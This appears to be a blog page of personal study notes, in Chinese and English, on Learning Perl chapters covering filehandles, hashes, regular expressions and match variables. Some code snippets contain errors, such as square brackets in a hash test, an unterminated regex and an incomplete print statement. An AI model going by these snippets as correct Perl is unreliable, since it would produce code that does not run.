id="用warn送出警告信息"><a href="#用warn送出警告信息" class="headerlink" title="用warn送出警告信息"></a>用warn送出警告信息</h3><p>产生警告信息，不会中止程序. </p><h3 id="自动检测致命错误"><a href="#自动检测致命错误" class="headerlink" title="自动检测致命错误"></a>自动检测致命错误</h3><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">use autodie<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><h3 id="使用filehandle"><a href="#使用filehandle" class="headerlink" title="使用filehandle"></a>使用filehandle</h3><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> @line = &lt;STDIN&gt;;<br><span class="hljs-keyword">if</span> (! <span class="hljs-keyword">open</span> PASSWD, <span class="hljs-string">&quot;/etc/passwd&quot;</span>) &#123;<br>    <span class="hljs-keyword">die</span> <span class="hljs-string">&quot;How did you get logged in? ($!)&quot;</span>;<br>&#125;<br><br><span class="hljs-keyword">while</span> (&lt;PASSWD&gt;) &#123;<br>    <span class="hljs-keyword">chomp</span>;<br>    ...<br>&#125;<br><br></code></pre></td></tr></table></figure><p>Using in <code>print</code>:</p><figure class="highlight monkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs monkey"><span class="hljs-built_in">print</span> <span class="hljs-built_in">LOG</span> <span class="hljs-string">&quot;Captain&#x27;s log, stardate 3.14159\n&quot;</span>;<br></code></pre></td></tr></table></figure><h3 id="改变默认的文件输出句柄"><a href="#改变默认的文件输出句柄" class="headerlink" title="改变默认的文件输出句柄"></a>改变默认的文件输出句柄</h3><p><code>print</code> 会默认输出到 <code>STDOUT</code> 中.</p><p>使用<code>select</code>:</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs abnf">select BEDROCK<span class="hljs-comment">;</span><br>print <span class="hljs-string">&quot;I hope&quot;</span><span class="hljs-comment">;</span><br><br></code></pre></td></tr></table></figure><p>也就是说, 这里的 <code>print</code> 就会输出到 <code>BEDROCK</code> 中.<br>特殊变量<code>$|</code>设置为1,使默认句柄在每次进行输出操作后立刻刷新缓冲区。</p><h3 id="用say函数输出"><a href="#用say函数输出" class="headerlink" title="用say函数输出"></a>用say函数输出</h3><p>会自动添加换行符。</p><h3 id="标量变量中的filehandle"><a href="#标量变量中的filehandle" class="headerlink" title="标量变量中的filehandle"></a>标量变量中的filehandle</h3><p>裸字bareword, 即像<code>STDIN</code>这种直接使用，而不是存储在变量中.</p><p>使用前需确保变量为空，以用来存放filehandle. 有人喜欢在变量名后面添加<code>_fh</code></p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> @line = &lt;STDIN&gt;;<br><span class="hljs-keyword">my</span> $rocks_fh;<br><span class="hljs-keyword">open</span> $rocks_fh, <span class="hljs-string">&#x27;&lt;&#x27;</span>, <span class="hljs-string">&#x27;rocks.txt&#x27;</span>;<br><br></code></pre></td></tr></table></figure><p>使用花括号，Perl会知道这个变量是filehandle: <code>print &#123; $rock_fh &#125;;</code></p><h3 id="Exercise-1"><a href="#Exercise-1" class="headerlink" title="Exercise"></a>Exercise</h3><p><code>&lt;STDIN&gt;</code> 只接受一行的输入。</p><p>从标准输入中获取多行:</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">my <span class="hljs-meta">@line</span> = <span class="hljs-variable">&lt;STDIN&gt;</span>;<br></code></pre></td></tr></table></figure><p><code>print</code> 的一种用法:</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">print</span> <span class="hljs-string">&quot;the first string &quot;</span>, <span class="hljs-string">&quot;, the second string &quot;</span>;<br></code></pre></td></tr></table></figure><h1 id="CHAPTER-6-Hash"><a href="#CHAPTER-6-Hash" class="headerlink" title="CHAPTER 6 Hash"></a>CHAPTER 6 Hash</h1><p>哈希是一种数据结构。<br>和数组的区别：</p><pre><code class="hljs">1. 可以容纳任意多的值2. 用名字检索，键和值，键唯一。3. 没有顺序。</code></pre><p>键总会被转换为字符串。</p><p>哈希是从<code>awk</code>语言中引入的.</p><p>哈希是从键到值的单行道，无法从值反推出其键.</p><h2 id="访问哈希元素"><a href="#访问哈希元素" class="headerlink" title="访问哈希元素"></a>访问哈希元素</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$</span><span class="language-bash"><span class="hljs-built_in">hash</span>&#123;<span class="hljs-variable">$some_key</span>&#125;</span><br></code></pre></td></tr></table></figure><p>注意，使用的是花括号.</p><h3 id="赋值"><a href="#赋值" class="headerlink" title="赋值"></a>赋值</h3><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-symbol">$family</span>_name&#123;<span class="hljs-string">&#x27;fred&#x27;</span>&#125; = <span class="hljs-string">&#x27;flintstone&#x27;</span>;<br><span class="hljs-symbol">$family</span>_name&#123;<span class="hljs-string">&#x27;barney&#x27;</span>&#125; = <span class="hljs-string">&#x27;rubble&#x27;</span>;<br></code></pre></td></tr></table></figure><hr><p>哈希有自己的名称空间.</p><p>美元符号和花括号，显示一个哈希元素。</p><p>赋值时会<mark>创建哈希元素</mark>：</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-symbol">$family</span>_name&#123;<span class="hljs-string">&#x27;wilma&#x27;</span>&#125; = <span class="hljs-string">&#x27;flintstone&#x27;</span>;<br></code></pre></td></tr></table></figure><p>增加了一个新的键值对.</p><h2 id="访问整个哈希"><a href="#访问整个哈希" class="headerlink" title="访问整个哈希"></a>访问整个哈希</h2><p>赋值, 必须是偶数个：</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mel">%some_hash = (<span class="hljs-string">&#x27;foo&#x27;</span>, <span class="hljs-number">35</span>, <span class="hljs-string">&#x27;bar&#x27;</span>, <span class="hljs-number">12.4</span>);<br></code></pre></td></tr></table></figure><p>这里应该只能用 <code>()</code> 包裹.</p><p>在列表上下文中，哈希的值是简单的键-值对列表.</p><p>unwinding the hash – turning it back into a list of key-value pairs.</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-variable">@any_array</span> = %some_hash;<br></code></pre></td></tr></table></figure><p>顺序可能错乱.</p><h3 id="Hash-Assignment"><a href="#Hash-Assignment" class="headerlink" title="Hash Assignment"></a>Hash Assignment</h3><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> %new_hash = %old_hash;<br></code></pre></td></tr></table></figure><p>Perl 会先unwind the <code>%old_hash</code> into a list of key-vaule pairs, 然后赋给<code>%new_hash</code>.</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> %inverse_hash = <span class="hljs-keyword">reverse</span> %any_hash;<br></code></pre></td></tr></table></figure><p>键值会反转.</p><p>一个Perl的rule: The last in wins.</p><h2 id="The-Big-Arrow"><a href="#The-Big-Arrow" class="headerlink" title="The Big Arrow"></a>The Big Arrow</h2><p>The Big Arrow (&#x3D;&gt;), it’s just a different way to “spell” a comma. 在Perl中，可以使用胖箭头代替逗号.</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs livescript">my %last_name = ( <span class="hljs-comment"># a hash may be a lexical variable</span><br>    <span class="hljs-string">&#x27;fred&#x27;</span> =&gt; <span class="hljs-string">&#x27;flintstone&#x27;</span>,<br>    <span class="hljs-string">&#x27;dino&#x27;</span> =&gt; undef,<br>    <span class="hljs-string">&#x27;barney&#x27;</span> =&gt; <span class="hljs-string">&#x27;rubble&#x27;</span>,<br>)<br></code></pre></td></tr></table></figure><p>在使用<code>fat array</code>时，可以省略键两侧的引号：</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs livescript">my %last_name = ( <span class="hljs-comment"># a hash may be a lexical variable</span><br>    fred =&gt; <span class="hljs-string">&#x27;flintstone&#x27;</span>,<br>    dino =&gt; undef,<br>    barney =&gt; <span class="hljs-string">&#x27;rubble&#x27;</span>,<br>)<br></code></pre></td></tr></table></figure><p>Simple string without quote marks is called a bareword.</p><h2 id="Hash-Function"><a href="#Hash-Function" class="headerlink" title="Hash Function"></a>Hash Function</h2><p>在数组上下文中：<br><code>keys</code> function, return a list of all the keys in a hash.</p><p><code>values</code> function, return a list of corresponding values.</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> %hash = (<span class="hljs-string">&#x27;a&#x27;</span> =&gt; <span class="hljs-number">1</span>, <span class="hljs-string">&#x27;b&#x27;</span> =&gt; <span class="hljs-number">2</span>, <span class="hljs-string">&#x27;c&#x27;</span> =&gt; <span class="hljs-number">3</span>,);<br><span class="hljs-keyword">my</span> @k = <span class="hljs-keyword">keys</span> %hash;<br><span class="hljs-keyword">my</span> @v = <span class="hljs-keyword">values</span> %hash;<br><br></code></pre></td></tr></table></figure><p>在标量上下文中：<br>返回数量。</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> $count = <span class="hljs-keyword">keys</span> %hash; <br></code></pre></td></tr></table></figure><p>将哈希作为Boolean：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">if</span> (%<span class="hljs-built_in">hash</span>) [<br>  <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;That was a true value!\n&quot;</span>;<br>]<br></code></pre></td></tr></table></figure><p>当至少有一对时为真.</p><h3 id="The-each-Function"><a href="#The-each-Function" class="headerlink" title="The each Function"></a>The each Function</h3><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">while</span> ( ($key, $value) = <span class="hljs-keyword">each</span> %hash ) &#123;<br>  <span class="hljs-keyword">print</span> <span class="hljs-string">&quot;$key =&gt; $value\n&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="The-exists-Function"><a href="#The-exists-Function" class="headerlink" title="The exists Function"></a>The exists Function</h3><p>To see whether a key exists in the hash.</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mel"><span class="hljs-keyword">if</span> (<span class="hljs-keyword">exists</span> $books&#123;<span class="hljs-string">&quot;dino&quot;</span>&#125;) &#123;<br>  <span class="hljs-keyword">print</span> <span class="hljs-string">&quot;Hey, there&#x27;s a library card for dino!\n&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="The-delete-Function"><a href="#The-delete-Function" class="headerlink" title="The delete  Function"></a>The delete  Function</h3><p>The delete function removes the given key (and its corresponding value).</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> $person = <span class="hljs-string">&quot;betty&quot;</span>;<br><span class="hljs-keyword">delete</span> $books&#123;$person&#125;;<br></code></pre></td></tr></table></figure><h3 id="Hash-Element-Interpolation"><a href="#Hash-Element-Interpolation" class="headerlink" title="Hash Element Interpolation"></a>Hash Element Interpolation</h3><p>The magical charaacters that need blackslashing in double quotes: <code>$</code> and <code>@</code>, <code>&quot;</code> and <code>\</code>.</p><h3 id="The-ENV-hash"><a href="#The-ENV-hash" class="headerlink" title="The %ENV hash"></a>The %ENV hash</h3><p>%ENV hash stores the info of environment.<br>You can see a PATH key in %ENV:</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">print</span> <span class="hljs-string">&quot;PATH is <span class="hljs-variable">$ENV</span>&#123;PATH&#125;\n&quot;</span>;<br></code></pre></td></tr></table></figure><h2 id="Exercise-2"><a href="#Exercise-2" class="headerlink" title="Exercise"></a>Exercise</h2><p>The <code>chomp</code> function is vital to get input from <code>&lt;STDIN&gt;</code>.</p><p>给哈希赋值使用的是<code>()</code>是列表，使用哈希的时候用<code>&#123;&#125;</code>花括号.</p><p>把未定义的值当成数字使用时，Perl会自动将它转换成0.</p><p>不能对哈希使用<code>push</code>等操作。</p><p>使用<code>my</code>声明多个变量：</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-selector-tag">my</span>(<span class="hljs-variable">@words</span>, %count, $word);<br></code></pre></td></tr></table></figure><h1 id="CHAPTER-7-Regular-Expressions"><a href="#CHAPTER-7-Regular-Expressions" class="headerlink" title="CHAPTER 7 Regular Expressions"></a>CHAPTER 7 Regular Expressions</h1><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-variable">$_</span> = <span class="hljs-string">&quot;yabba dabba doo&quot;</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-regexp">/abba/</span>) &#123;<br>  print <span class="hljs-string">&quot;It matched!\n&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>在字符串中匹配到其中的一部分。</p><p><mark>Interpolating</mark> a variable into a pattern:</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">while</span> ( &lt;STDIN&gt; ) &#123;<br>   chomp;<br>   <span class="hljs-keyword">if</span> ( /<span class="hljs-variable">$ARGV</span>[0]/ ) &#123;<br>     <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;\tMatches\n&quot;</span>;<br>   &#125;<br>   <span class="hljs-keyword">else</span> &#123;<br>     <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;\tDoesn&#x27;t match\n&quot;</span>;<br>   &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="The-Wildcard"><a href="#The-Wildcard" class="headerlink" title="The Wildcard"></a>The Wildcard</h2><p>The dot <code>.</code> matches any single character except a newline. <code>\N</code>也有同样的效果。</p><p>The backslash<code>\</code>也是metacharacter.</p><h2 id="Unicode属性"><a href="#Unicode属性" class="headerlink" title="Unicode属性"></a>Unicode属性</h2><p><mark>匹配属性</mark></p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">\p&#123;<span class="hljs-keyword">PROPERTY</span><span class="hljs-title"></span>&#125;<br></code></pre></td></tr></table></figure><p><code>p</code> 改为大写表示相反的含义。 </p><h2 id="Quantifier"><a href="#Quantifier" class="headerlink" title="Quantifier"></a>Quantifier</h2><p>如<code>*</code>和<code>+</code>.</p><p><code>?</code>.</p><h2 id="Anchors"><a href="#Anchors" class="headerlink" title="Anchors"></a>Anchors</h2><p><code>\A</code> anchor matches at the absolute beginning of a string.</p><p><code>\z</code> matches the end of the string.<br><code>\Z</code> allows an optional newline after it.</p><p><code>^</code> caret, match the beginning of line.<br><code>$</code> match the end of line.</p><h3 id="Word-Anchors"><a href="#Word-Anchors" class="headerlink" title="Word Anchors"></a>Word Anchors</h3><p><code>\b</code>.</p><p>like:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/\bfred\b/</span><br></code></pre></td></tr></table></figure><p>It matches at the start or end of a group of <code>\w</code> characters.</p><p>The <mark>nonword-boundary anchor</mark><br><code>\B</code>.</p><h2 id="模式分组"><a href="#模式分组" class="headerlink" title="模式分组"></a>模式分组</h2><p>使用小括号<code>()</code>. 圆括号也是元字符。</p><p><mark>back reference</mark><br>为什么叫 back reference , 可能是要往回看括号里面的内容，所以是“back”.</p><p>用括号捕获，反斜线加数字引用。引用的含义是再次匹配括号的内容。要忽略嵌套.</p><p>通过左括号判断次序。</p><p>新的写法：<code>\g&#123;N&#125;</code>, N为组号。使用perl5.10。</p><p><mark>relative back reference</mark>相对反向引用。<br>使用负数，从当前位置往前数.</p><h2 id="择一匹配"><a href="#择一匹配" class="headerlink" title="择一匹配"></a>择一匹配</h2><p>竖线<code>|</code>.</p><h2 id="字符集"><a href="#字符集" class="headerlink" title="字符集"></a>字符集</h2><p>character class, <code>[]</code>.</p><p>脱字符<code>^</code>.</p><h2 id="字符集的简写"><a href="#字符集的简写" class="headerlink" title="字符集的简写"></a>字符集的简写</h2><p>如 <code>\d</code> 表示任意一个数字。</p><p><code>\R</code>匹配任意一种断行符。</p><p><code>\w</code>匹配单词字符。</p><p><code>\s</code>匹配空白字符。</p><h2 id="Exercise-3"><a href="#Exercise-3" class="headerlink" title="Exercise"></a>Exercise</h2><p>反向引用引用的是匹配到的值。</p><h1 id="CHAPTER-8-Matching-with-Regular-Expressions"><a href="#CHAPTER-8-Matching-with-Regular-Expressions" class="headerlink" title="CHAPTER 8 Matching with Regular Expressions"></a>CHAPTER 8 Matching with Regular Expressions</h1><h2 id="Matches-with-m-x2F-x2F"><a href="#Matches-with-m-x2F-x2F" class="headerlink" title="Matches with m&#x2F;&#x2F;"></a>Matches with m&#x2F;&#x2F;</h2><p><code>/pattern/</code> is a short cut of <code>m/pattern/</code>, pattern match operator. 模式匹配。</p><p>可以使用不同的分界符：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">m</span><span class="hljs-params">(fred)</span></span><br>m&lt;fred&gt;<br>m&#123;fred&#125;<br>...<br></code></pre></td></tr></table></figure><p>使用<code>/pattern/</code>可省略<code>m</code>.</p><h2 id="Match-Modifier"><a href="#Match-Modifier" class="headerlink" title="Match Modifier"></a>Match Modifier</h2><p>Sometimes called flags.</p><h3 id="Case-Insentive-Matching-with-i"><a href="#Case-Insentive-Matching-with-i" class="headerlink" title="Case-Insentive Matching with /i"></a>Case-Insentive Matching with <code>/i</code></h3><p>Using <code>/i</code> modifier.</p><h3 id="Matching-Any-Character-with-s"><a href="#Matching-Any-Character-with-s" class="headerlink" title="Matching Any Character with /s"></a>Matching Any Character with <code>/s</code></h3><p>让<code>.</code>能够匹配换行符。Using <code>/s</code>.</p><p>v5.12新增<code>\N</code>代表<code>\n</code>的补集。</p><h3 id="Adding-Whitespace-with-x"><a href="#Adding-Whitespace-with-x" class="headerlink" title="Adding Whitespace with \x"></a>Adding Whitespace with <code>\x</code></h3><p>让正则表达式中的whitespace不起作用:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/ -? [0-9]+ \.? [0-9] /</span>x<br></code></pre></td></tr></table></figure><p>不会匹配其中的空格.如果要匹配whitespace可以使用<code>\s</code>或escape a literal space.</p><h3 id="Combining-Option-Modifiers"><a href="#Combining-Option-Modifiers" class="headerlink" title="Combining Option Modifiers"></a>Combining Option Modifiers</h3><p>使用多个modifier, like:</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-keyword">if</span> (<span class="hljs-regexp">/barney.*fred/i</span>s) &#123;<br>    ...<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="Choosing-a-Character-Interpretation"><a href="#Choosing-a-Character-Interpretation" class="headerlink" title="Choosing a Character Interpretation"></a>Choosing a Character Interpretation</h3><p>在 Perl v5.14 中添加的特性，选择解释方式like:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/\w+/</span>a  <span class="hljs-comment">#use the ASCII interpretation of character classes</span><br><span class="hljs-regexp">/\w+/u</span>  <span class="hljs-comment">#use Unicode</span><br><span class="hljs-regexp">/\w+/</span>l  <span class="hljs-comment">#respect the locale</span><br></code></pre></td></tr></table></figure><p><mark>case fold</mark><br>In Unicode, lowercasing is not one-to-one.</p><p>只对应ASCII字符的大小写:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/k/</span>aai<br></code></pre></td></tr></table></figure><p>用两个<code>\a</code>modifier.</p><p>使用<code>chr()</code> to ensure we get the right bit pattern regardless of the encoding issues:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs perl">$_ = &lt;STDIN&gt;;<br><span class="hljs-keyword">my</span> $OE = <span class="hljs-keyword">chr</span>( <span class="hljs-number">0xBC</span> );<br><span class="hljs-keyword">if</span> (<span class="hljs-regexp">/$OE/i</span>) &#123;<br>  <span class="hljs-keyword">print</span> <span class="hljs-string">&quot;Found $OE\n&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="Beginning-and-End-of-Line-Anchors"><a href="#Beginning-and-End-of-Line-Anchors" class="headerlink" title="Beginning and End-of-Line Anchors"></a>Beginning and End-of-Line Anchors</h3><p>如果没有<code>\m</code>那么<code>^</code>和<code>$</code>就和<code>\A</code>和<code>\Z</code>一样.</p><h2 id="The-Binding-Operator"><a href="#The-Binding-Operator" class="headerlink" title="The Binding Operator =~"></a>The Binding Operator <code>=~</code></h2><p>正则表达式默认作用于<code>$_</code>.</p><p>不再使用 default string , using <code>=~</code> tells Perl to match the pattern on the right against the string on the left:</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">my</span> <span class="hljs-variable">$some_other</span> = <span class="hljs-string">&quot;I dream of betty rubbls,&quot;</span>;<br><span class="hljs-attribute">if</span> (<span class="hljs-variable">$some_other</span> =<span class="hljs-regexp">~ /\brub\b)</span> &#123;<br>  <span class="hljs-attribute">print</span> <span class="hljs-string">&quot;Aye, there&#x27;s the rub.\n&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>If there’s no binding operator, the expression uses <code>$_</code> by default.</p><p>只有<code>&lt;STDIN&gt;</code>单独出现在控制语句中，<code>$_</code>才会自动存储.</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">my <span class="hljs-symbol">$li</span>kes_perl = &lt;STDIN&gt; =~ <span class="hljs-regexp">/\byes\b/i</span>;<br></code></pre></td></tr></table></figure><h2 id="The-Match-Variables"><a href="#The-Match-Variables" class="headerlink" title="The Match Variables"></a>The Match Variables</h2><p>Each regular expression capture holds part of the original string, not part of the pattern.</p><p>They are named like <code>$1</code>.</p><p><mark>The difference of <code>\4</code> and <code>$4</code></mark><br><code>\4</code> refers back to the capture during the pattern while it is trying to match.</p><p><code>$4</code> refers to the capture of an already completed pattern match.</p><p>一个是匹配时用, 一个是匹配后用.</p><p>Empty string 和 undef 是不同的，if you have three or fewer sets of parentheses in the pattern, $4 will be undef.</p><h2 id="The-Persistence-of-Captures"><a href="#The-Persistence-of-Captures" class="headerlink" title="The Persistence of Captures"></a>The Persistence of Captures</h2><p>These capture variables generally stay around until the next successful pattern match.</p><p>If you need a capture for more than a few lines, it’s generally best to copy it into an ordinary variable.</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> $wilma_word = $1;<br></code></pre></td></tr></table></figure><h2 id="Noncapturing-Parentheses"><a href="#Noncapturing-Parentheses" class="headerlink" title="Noncapturing Parentheses"></a>Noncapturing Parentheses</h2><p>Adding <code>?:</code> after the opening parenthesis, which tell Perl you only want to use these parenthesis fo grouping.</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-keyword">if</span> (<span class="hljs-regexp">/(?:bronto)?saurus (steak|burger)/</span>) &#123;<br>    <span class="hljs-keyword">print</span> <span class="hljs-string">&quot;Fred wants a $1\n&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>使用<code>\n</code>flag, which is added in v5.22, 可以把所有括号转换为noncapturing groups.</p><p>命名match variable, adding in Perl v5.10.<br>匹配到的内容存放在hash<code>%+</code>中:</p><p>在regex中用<code>?&lt;LABEL&gt;PATTERN</code> 也就是指定标记而不是 1, 2, 3…</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">use</span> v5.<span class="hljs-number">10</span>;<br><br><span class="hljs-attribute">my</span> <span class="hljs-variable">$names</span> = <span class="hljs-string">&#x27;Fred or Barney&#x27;</span>;<br><span class="hljs-attribute">if</span> ( <span class="hljs-variable">$names</span> =<span class="hljs-regexp">~ m/(?&lt;name1&gt;\w+)</span> (?:and|or) (?&lt;name2&gt;\w+)/) &#123;<br>  <span class="hljs-attribute">say</span> <span class="hljs-string">&quot;I saw $+&#123;name1&#125; and $+&#123;name2&#125;&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>使用<code>\g&#123;lable&#125;</code> to back reference. 因为没有数字标记.</p><h2 id="The-Automatic-Match-Variables"><a href="#The-Automatic-Match-Variables" class="headerlink" title="The Automatic Match Variables"></a>The Automatic Match Variables</h2><p>为了避免和自己命名的容易重合，many of Perl’s build-in variables 具有奇怪的名字.</p><p>Three automatic match variables: <code>$&amp;</code>, <code>$上飘</code> and <code>$&#39;</code>.</p><p><code>$&amp;</code> stores the actually matched pattern.</p><p><code>$上飘</code> stores whatever came before the matched session. </p><p><code>$&#39;</code> stores whatever came after the matched session.</p><p>所以就是前中后. They will stay around until the next successful pattern match. 使用这些automatic match variable 会让程序变慢.</p><p>在 v5.10 或更高版本中， 可以通过添加 <code>/p</code> 标记来使用:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-variable">$&#123;^PREMATCH&#125;</span> <span class="hljs-variable">$&#123;^MATCH&#125;</span> <span class="hljs-variable">$&#123;^POSTMATCH&#125;</span><br></code></pre></td></tr></table></figure><h2 id="Precedence"><a href="#Precedence" class="headerlink" title="Precedence"></a>Precedence</h2><p>关于两个之间的结合。</p><p>只有四个level.</p><pre><code class="hljs">1.parentheses () 2.quantifier *, + and ?, &#123;n,m&#125;3.anchors and sequence \A, \Z, \z, ^, $, \b, \B4.vertical bar |5.so-called atoms</code></pre><h2 id="A-Pattern-Test-Program"><a href="#A-Pattern-Test-Program" class="headerlink" title="A Pattern Test Program"></a>A Pattern Test Program</h2><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">while</span> (&lt;&gt;) &#123;    <span class="hljs-comment"># take one input line at a time</span><br>  <span class="hljs-keyword">chomp</span>;<br>  <span class="hljs-keyword">if</span> (<span class="hljs-regexp">/YOUR_PATTERN_GOES_HERE/</span>) &#123;<br>     <span class="hljs-keyword">print</span> <span class="hljs-string">&quot;Matched: |$上飘&lt;$&amp;&gt;$&#x27;|\n&quot;</span>;  <span class="hljs-comment"># the special match vars</span><br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">print</span> <span 